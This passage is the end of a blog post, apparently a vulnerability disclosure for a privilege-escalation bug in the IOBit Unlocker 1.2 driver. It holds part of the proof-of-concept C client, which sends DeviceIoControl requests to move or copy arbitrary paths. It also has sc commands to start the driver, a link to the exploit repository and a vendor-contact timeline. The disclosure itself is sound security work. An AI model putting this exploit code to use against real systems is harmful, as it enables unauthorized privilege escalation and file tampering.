</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)((SIZE_T)input_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter new path (move operation):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)((SIZE_T)input_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>;
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter new path (copy operation):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)((SIZE_T)input_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Couldn&#39;t open the driver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(hDriver);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Testing:</p>
<p>The driver is normally started only if we start the main application, and once we exit it will be terminated and disabled. If we want to start it manually for the testing, we need to start it by our own:</p>
<pre tabindex="0"><code>sc config iobitunlocker start= demand
sc start iobitunlocker
</code></pre><p>POC code available at:
<a href="https://github.com/theevilbit/exploits/tree/master/IOBit%20Unlocker%201.2%20LPE/UnlockExploit"  class="external-link" target="_blank" rel="noopener">IOBit Unlocker POC</a></p>
<p>Contact / vendor notification:</p>
<ol>
<li>2019.07.25. - Initial contact through webform - never got response</li>
<li>2019.07.29. - Contact CERT - CERT never got response from vendor</li>
<li>2019.08.20. - Try to contact vendor via Twitter - never got response</li>
<li>2019.08.20. - Contact MITRE for CVE assignment (no response)</li>
<li>2019.09.03. - Last trial through web form (sent in full report), no response</li>
<li>2019.10.12. - Public disclosure</li>
</ol>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2019 -
    
    2025
     Csaba Fitzl 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
